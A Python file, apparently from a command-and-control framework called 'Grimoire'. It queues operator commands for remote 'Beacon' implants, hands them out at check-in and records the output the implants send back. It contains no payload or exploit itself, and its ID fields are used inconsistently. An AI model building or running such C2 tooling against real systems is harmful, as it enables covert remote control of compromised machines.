import json
from typing import Dict, Any

from server.persistence.models import Task, TaskOutput, Beacon
from sqlalchemy.orm import Session
from datetime import datetime


class GrimoireTaskService:
    """
    任务服务层：处理任务的创建、分配、状态更新和结果记录。
    所有方法都需要一个 Session 实例作为第一个参数。
    """

    def create_task(self, db: Session, beacon_id: str, command: str, arguments: str = None) -> Task:
        """
        由 Web UI 调用创建一个新任务并存入数据库。
        """
        # 检查 Beacon 是否存在且活跃
        beacon = db.query(Beacon).filter(Beacon.id == beacon_id, Beacon.status == 'Active').first()
        if not beacon:
            raise ValueError(f"Beacon ID {beacon_id} not found or inactive.")

        # 创建任务对象
        new_task = Task(
            beacon_id=beacon_id,
            command=command,
            arguments=arguments if arguments else '',
            status='PENDING',  # 默认状态为待处理
            created_at=datetime.utcnow()
        )

        # 将任务加入 Session (等待 commit)
        db.add(new_task)

        return new_task

    def get_pending_task(self, db: Session, beacon_id: str) -> dict | None:
        """
        由 Beacon Check-in 调用查询数据库中分配给该 Beacon 的第一个待处理任务。
        """
        # 查找最旧的 PENDING 任务
        task = (db.query(Task)
                .filter(Task.beacon_id == beacon_id, Task.status == 'PENDING')
                .order_by(Task.created_at)  # 按照创建时间排序，先创建的先执行
                .first())

        if task:
            # 状态转换：将任务状态更新为 ASSIGNED
            task.status = 'ASSIGNED'
            task.assigned_at = datetime.utcnow()
            db.add(task)

            print(f"[{beacon_id[:8]}]: Assigning Task {task.id} ({task.command})")

            # 返回一个字典结构，方便 Beacon 端解析
            return {
                "task_id": task.task_id,
                "command": task.command,
                "arguments": task.arguments
            }

        return None  # 没有待处理任务

    def record_output(self, db: Session, task_id: int, output_data: str):
        """
        由 Beacon Check-in 调用接收任务回显，更新任务状态和结果。
        """

        # 查找任务，并且我们只接受 ASSIGNED 状态的任务回显
        task = db.query(Task).filter(Task.task_id == task_id, Task.status == 'ASSIGNED').first()

        if not task:
            print(f"ERROR: Received output for non-existent task ID: {task_id}")
            return

        if task.status != 'ASSIGNED':
            # 避免重复记录，但允许 COMPLETED 状态的任务回传更新
            print(f"WARNING: Output received for task {task_id} in status {task.status}")


        # 状态转换：更新任务状态为 COMPLETED
        task.status = 'COMPLETED'

        # 记录输出 (使用 TaskOutput 模型)
        output = TaskOutput(
            task_id=task_id,
            output_data=output_data
        )

        # 更新 Task 的 last_updated time
        task.last_updated = datetime.utcnow()

        db.add(output)

        print(f"[{task.beacon_id[:8]}]: Task {task_id} result recorded.")

    def process_and_get_task(self, db: Session, beacon_id: str, plaintext_data: bytes) -> Dict[str, Any]:
        """
        处理 Beacon 的心跳请求,分别有两个步骤：
            1. 尝试解析回传数据，并调用 record_output。
            2. 调用 get_pending_task 获取下一个任务。
        """

        # 默认响应：让 Beacon 休眠 10 秒
        default_response = {"command": "sleep", "interval": 10}

        try:
            # 解析 Beacon 回传的 JSON 数据
            # 假设 Beacon 回传的 JSON 格式为: {"task_id": 123, "output": "..."}
            beacon_data: Dict[str, Any] = json.loads(plaintext_data.decode('utf-8'))

            if 'task_id' in beacon_data and 'output' in beacon_data:
                task_id = beacon_data['task_id']
                output_str = beacon_data['output']

                # 记录结果
                self.record_output(db, task_id, output_str)

            # 获取下一个待分配的任务
            next_task = self.get_pending_task(db, beacon_id)

            if next_task:
                return next_task

            # 如果没有任务，返回默认休眠指令
            return default_response

        except json.JSONDecodeError:
            print(f"ERROR: Beacon {beacon_id[:8]} uploaded invalid JSON data.")
            # 如果解析失败，仍然返回默认休眠指令，不影响下一次签入
            return default_response
        except Exception as e:
            print(f"ERROR: Task processing failed for {beacon_id[:8]}: {e}")
            return default_response